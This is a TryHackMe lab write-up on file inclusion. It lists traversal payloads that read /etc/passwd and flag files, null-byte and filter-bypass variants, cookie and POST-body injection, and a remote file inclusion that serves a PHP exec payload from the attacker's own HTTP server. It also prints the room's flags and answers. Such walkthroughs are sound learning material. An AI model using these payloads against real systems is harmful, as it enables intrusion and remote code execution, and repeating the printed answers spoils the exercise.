# THM - File Inclusion

<br>

http://10.10.137.131/

<br>

## Task 3

### Task 3.1

> file_get_contents


<br>

## Task 4

### Task 4.1

http://10.10.137.131/lab1.php?file=/etc/passwd

> lab1.php?file=/etc/passwd


### Task 4.2

> includes

http://10.10.137.131/lab2.php?file=../../../../etc/passwd


<br>

## Task 5

### Task 5.1

http://10.10.137.131/lab3.php?file=../../../../etc/passwd%00

> /lab3.php?file=../../../../etc/passwd%00


### Task 5.2

> file_get_contents

http://10.10.137.131/lab4.php?file=/etc/passwd/.


http://10.10.137.131/lab5.php?file=....//....//....//....//etc/passwd


### Task 5.3

> THM-profile


### Task 5.4

http://10.10.137.131/lab6.php?file=THM-profile/../../../../etc/os-release

> 12.04

<br>

## Task 8

http://10.10.137.131/challenges/index.php

### Task 8.1

http://10.10.137.131/challenges/chall1.php

```html
<form action="#" method="POST">
	...
</form>
```

input: /etc/flag1

> F1x3d-iNpu7-f0rrn


### Task 8.2

http://10.10.137.131/challenges/chall2.php

```text
(Firefox Browser Developer Edition)

Cookies:
	Name: THM
	Value: Admin
```

```text
(Firefox Browser Developer Edition)

Cookies:
	Name: THM
	Value: ../../../../etc/flag2%00
```

> c00k13_i5_yuMmy1



### Task 8.3

```text
(Firefox Browser Developer Edition)

Resend/New Request:
	POST
	
	Body: file=../../../../etc/flag3%00
```

> P0st_1s_w0rk1in9



### Task 8.4

```shell
echo "<?PHP print exec('hostname'); ?>" > cmd.txt

sudo python3 -m http.server 9876
```

http://10.10.208.238/playground.php?file=http://10.9.2.7:9876/cmd.txt

> lfi-vm-thm-f8c5b1a78692

